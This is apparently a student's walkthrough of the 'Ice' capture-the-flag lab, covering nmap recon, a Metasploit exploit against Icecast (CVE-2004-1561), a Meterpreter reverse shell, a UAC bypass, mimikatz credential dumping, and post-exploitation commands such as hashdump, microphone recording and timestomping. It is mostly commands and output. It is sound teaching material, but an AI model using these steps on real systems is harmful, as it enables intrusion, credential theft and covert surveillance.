---
title: Ice
---

	- [met](#met)
	- [msf](#msf)

# Tools & Commands

- nmap
- msfconsole: search, use, set, run
- meterpreter: sysinfo, bg, ps, migrate, load, man

# Task 1 - Set up VM

# Task 2 - Recon

```bash
$ sudo nmap -sS -p- 10.10.104.197 # syn scan, all ports
$ nmap -sV -p8000 10.10.104.197 # icecast
$ nmap -sC 10.10.104.197 # script scan, find host name
```

# Task 3 - Access

[CVE security vulnerability database. Security vulnerabilities, exploits, references and more](https://www.cvedetails.com/google-search-results.php?q=icecast)

Exec Code Overflow → *Execute* Code Overflow 😠

CVE-2004-1561

```bash
$ msfconsole
msf5 > search icecast
exploit/windows/http/icecast_header
msf5 > use 0
msf5 > options
msf5 > set RHOSTS 10.10.104.197
msf5 > set LHOST 10.4.5.126 # tun0 from ifconfig
msf5 > set payload windows/meterpreter/reverse_tcp # as reverse_https is buggy
msf5 > run
[*] Started HTTPS reverse handler on https://192.168.187.128:8443
[*] Exploit completed, but no session was created.
# update metasploit
$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```

# Task 4 - Escalate

```bash
met > ps
# User: Dark

met > sysinfo
# Build 7601
# Arch: x64

met > run post/multi/recon/local_exploit_suggester
[+] 10.10.39.20 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.

met > bg

msf5 > use exploit/windows/local/bypassuac_eventvwr
msf5 > set session 1
msf5 > set lhost 10.4.5.126
msf5 > run
[*] Started HTTPS reverse handler on https://10.4.5.126:8443
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Cleaning up registry keys ...
[*] https://10.4.5.126:8443 handling request from 10.10.39.20; (UUID: rzlyupif) Staging x86 payload (177241 bytes) ...
[*] Meterpreter session 4 opened (10.4.5.126:8443 -> 10.10.39.20:49317) at 2020-06-24 07:19:20 -0400

met > getprivs
Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

# Task 5 - Looting

```bash
met > ps

# In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass.

met > migrate -N spoolsv.exe
[*] Migrating from 2884 to 1360...
[*] Migration completed successfully.

met > load kiwi #mimikatz
met > creds_all
[..] Password01! [..]
```

# Task 6 - Post Exploitation

### met

hashdump # dump password hashes
screenshare # see screen
record_mic
timestomp # change file edit dates
golden_ticket_create # easy authentification

### msf

run post/windows/manage/enable_rdp # use password from above

# Task 7 - Further Credit

[Offensive Security's Exploit Database Archive](https://www.exploit-db.com/exploits/568)